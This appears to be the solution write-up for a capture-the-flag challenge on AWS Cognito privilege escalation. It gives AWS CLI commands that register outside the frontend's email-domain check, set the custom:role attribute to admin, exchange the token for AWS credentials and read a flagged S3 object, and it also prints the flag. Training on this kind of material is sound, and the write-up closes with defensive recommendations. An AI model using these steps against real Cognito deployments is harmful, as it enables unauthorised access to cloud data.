# Challenge 02 - AWS Cognito Privilege Escalation Solution

## Attack Flow

### Step 1: Reconnaissance
- Navigate to the web application
- Inspect source code to find Cognito configuration
- Extract User Pool ID, Client ID, and Identity Pool ID

### Step 2: Bypass Registration Validation
The frontend validates email domains, but this can be bypassed by registering directly via AWS CLI:

```bash
aws cognito-idp sign-up \
  --client-id 'CLIENT_ID' \
  --username 'attacker@example.com' \
  --password 'SecurePass123!' \
  --user-attributes '[
    {"Name":"given_name","Value":"John"},
    {"Name":"family_name","Value":"Doe"}
  ]'
```

### Step 3: Email Verification
Verify the email address using the confirmation code:

```bash
aws cognito-idp confirm-sign-up \
  --client-id 'CLIENT_ID' \
  --username 'attacker@example.com' \
  --confirmation-code 'VERIFICATION_CODE'
```

### Step 4: Login and Extract Tokens
- Login through the web interface
- Extract `access_token` and `id_token` from browser localStorage
- Note the initial `custom:role` attribute is set to `reader`

### Step 5: Privilege Escalation
Update the custom role attribute to escalate privileges:

```bash
aws cognito-idp update-user-attributes \
  --access-token 'ACCESS_TOKEN' \
  --user-attributes '[{"Name":"custom:role","Value":"admin"}]'
```

### Step 6: Obtain AWS Credentials
Get Identity Pool credentials using the updated ID token:

```bash
# Get Identity ID
aws cognito-identity get-id \
  --identity-pool-id 'IDENTITY_POOL_ID' \
  --logins "cognito-idp.REGION.amazonaws.com/USER_POOL_ID=ID_TOKEN"

# Get AWS credentials
aws cognito-identity get-credentials-for-identity \
  --identity-id 'IDENTITY_ID' \
  --logins "cognito-idp.REGION.amazonaws.com/USER_POOL_ID=ID_TOKEN"
```

### Step 7: Access the Flag
Use the obtained AWS credentials to access the S3 bucket containing the flag:

```bash
export AWS_ACCESS_KEY_ID="OBTAINED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="OBTAINED_SECRET_KEY"
export AWS_SESSION_TOKEN="OBTAINED_SESSION_TOKEN"

aws s3 cp s3://FLAG_BUCKET_NAME/flag.txt ./flag.txt
cat flag.txt
```

## Key Learning Points

1. **Client-side validation is insufficient**: Always implement server-side validation for security controls
2. **Custom attributes security**: Carefully consider which attributes users can modify and implement proper authorization checks
3. **Identity Pool role mapping**: Use fine-grained role mapping rules and avoid overly permissive configurations
4. **Token exposure**: Sensitive tokens stored in browser storage can be extracted and misused

## Flag

`CTF{c0gn1t0_pr1v1l3g3_3sc4l4t10n_vuln3r4b1l1ty}`

## Security Recommendations

1. **Server-side validation**: Implement email domain validation on the backend
2. **Attribute protection**: Mark sensitive custom attributes as admin-only or implement proper authorization
3. **Role mapping**: Use more specific role mapping rules based on verified claims
4. **Least privilege**: Apply principle of least privilege to IAM roles
5. **Token security**: Consider using secure, httpOnly cookies instead of localStorage for token storage
